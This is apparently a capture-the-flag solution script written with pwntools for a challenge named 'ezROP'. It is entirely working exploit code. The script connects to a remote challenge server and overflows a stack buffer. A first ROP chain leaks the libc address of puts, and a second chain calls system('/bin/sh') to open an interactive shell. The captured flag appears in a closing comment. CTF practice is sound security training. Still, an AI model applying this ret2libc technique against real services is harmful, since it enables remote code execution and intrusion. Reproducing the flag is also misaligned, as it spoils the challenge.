from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

# p = gdb.debug('./ezROP', '''
#     b main
#     continue
# ''')

p = remote('recruit.osiris.bar', 21002)

e = ELF('./ezROP')
r = ROP('./ezROP')
glibc_e = ELF('./libc.so.6')

chain1 = [
    r.rdi.address,
    e.got.puts,
    e.plt.puts,
    e.symbols.main
]

msg_1 = b"\0"*0x78 + b"".join([p64(c1) for c1 in chain1])
p.sendlineafter("?\n", msg_1)

p.readuntil("!\n")
libc_puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.warning(f"Leaked libc puts address: {hex(libc_puts_addr)}")
libc_base_addr = libc_puts_addr - glibc_e.symbols.puts

chain2 = [
    r.rdi.address,
    libc_base_addr+next(glibc_e.search(b"/bin/sh")),
    r.ret.address,
    libc_base_addr+glibc_e.symbols.system
]

msg_2 = b"\0"*0x78 + b"".join([p64(c2) for c2 in chain2])
p.sendlineafter("?\n", msg_2)

p.interactive()

# flag{c92828b32cc9494689ccf4bde219dccbda5c561e6d7931105443d08ec28aaacd}
